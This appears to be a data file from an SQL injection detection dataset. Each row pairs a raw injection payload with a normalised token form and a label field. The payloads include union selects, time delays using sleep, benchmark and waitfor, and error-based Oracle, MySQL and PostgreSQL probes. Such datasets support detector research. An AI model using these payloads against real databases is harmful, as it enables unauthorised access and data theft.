id|payload_norm
"5719"|"1' ) ) ) union all select null#","__INT__ ) ) ) union all select null","","","0.0"
"5720"|"select * from users WHERE username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'kfff\' = \'kfff"" or username = ""1 )","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and \ __STR__ = __IDENT__ __STR__ __INT__ )","","","0.0"
"5721"|"select * from users WHERE username = ""1 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-5863"" and ( ( ( \'itxy\' like \'itxy""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and ( ( ( \ __STR__ like __IDENT__","","","0.0"
"5722"|"1' ) and elt ( 1210 = 1210,sleep ( 5 ) )","__INT__ ) and __IDENT__ ( __INT__ = __INT__ , sleep ( __INT__ ) )","","","0.0"
"5723"|"1'+ ( select qymy where 8657 = 8657 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","__INT__ + ( select __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( left ( __IDENT__ ( char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) - -","","","0.0"
"5724"|"select * from users WHERE username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\' ) ) )","select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) )","","","0.0"
"5725"|"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""chvi"" like ""chvi","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5726"|"1 or elt ( 6272 = 6272,sleep ( 5 ) )","__INT__ or __IDENT__ ( __INT__ = __INT__ , sleep ( __INT__ ) )","","","0.0"
"5727"|"1"" ) ) union all select null--","__INT__ ) ) union all select null - -","","","0.0"
"5728"|"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#","- __INT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__","","","0.0"
"5729"|"select * from users WHERE username = ""1 ) ) ) and ( ( ( 3505 = 3505"" and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__","","","0.0"
"5730"|"select * from users WHERE username = ""-1641\' ) ) or username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1 ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) ) and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ )","","","0.0"
"5731"|"-9315' ) ) ) union all select 5057,5057,5057,5057,5057#","- __INT__ ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__","","","0.0"
"5732"|"select * from users WHERE username = ""-5863"" or username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ __INT__ ) ) )","","","0.0"
"5733"|"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'ltym' = 'ltym","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5734"|"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( 8254 = 8254""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ or __IDENT__ = __STR__ and ( ( __INT__ = __INT__","","","0.0"
"5735"|"select * from users WHERE username = ""-9987 ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ - __INT__","","","0.0"
"5736"|"-1011 or 7140 = 9977--","- __INT__ or __INT__ = __INT__ - -","","","0.0"
"5737"|"select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-8353\' ) ) )","select * from __IDENT__ where __IDENT__ = "" - __INT__ % \ __STR__ ) ) )","","","0.0"
"5738"|"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\' ) ) )","select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) )","","","0.0"
"5739"|"1"" ) ) as aozi where 3354 = 3354 waitfor delay '0:0:5'--","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ waitfor delay __STR__ - -","","","0.0"
"5740"|"-6125'|| ( select 'hwnm' where 1428 = 1428 union all select 1428,1428,1428,1428,1428,1428#","- __INT__ __STR__ __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__","","","0.0"
"5741"|"1 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # eahg","__INT__ or __IDENT__ ( ~ ( select * from ( select concat ( __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ , __HEX__ ) ) __IDENT__ ) ) # __IDENT__","","","0.0"
"5742"|"select * from users WHERE username = ""1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1 ) ) as atiy where 3855 = 3855","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5743"|"select * from users WHERE username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'rxzr\' = \'rxzr"" or username = ""1%\' ) ) and ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5744"|"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7720 ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) )","","","0.0"
"5745"|"-1513"" ) as swvd where 2958 = 2958 union all select 2958,2958,2958--","- __INT__ ) as __IDENT__ where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ - -","","","0.0"
"5746"|"select * from users WHERE username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # sipo"" and username = ""-6190\' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-4952\' ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ __STR__ ) ) )","","","0.0"
"5747"|"-2948' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'ivwt' = 'ivwt","- __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5748"|"select * from users WHERE username = ""1 ) ) and username = ""-2783%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ % \ __STR__ % \ __STR__ ""","","","0.0"
"5749"|"1' ) and make_set ( 6488 = 5525,5525 )","__INT__ ) and __IDENT__ ( __INT__ = __INT__ , __INT__ )","","","0.0"
"5750"|"1' in boolean mode ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) #","__INT__ in __IDENT__ __IDENT__ ) and char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) | | char ( __INT__ ) = __IDENT__ ( repeat ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) #","","","0.0"
"5751"|"1%"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = ""","__INT__ % __STR__ % __STR__","","","0.0"
"5752"|"select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) ""","","","0.0"
"5753"|"1'|| ( select 'gdzt' where 4950 = 4950","__INT__ __STR__ __IDENT__ where __INT__ = __INT__","","","0.0"
"5754"|"select * from users WHERE username = ""1\' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1\' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5755"|"-3107' ) where 7782 = 7782 or 8571 = 8571--","- __INT__ ) where __INT__ = __INT__ or __INT__ = __INT__ - -","","","0.0"
"5756"|"select * from users WHERE username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" or username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5757"|"select * from users WHERE username = ""1"" or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ - __INT__ __STR__ ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5758"|"1'+ ( select 'mzee' where 5984 = 5984","__INT__ __STR__ __IDENT__ where __INT__ = __INT__","","","0.0"
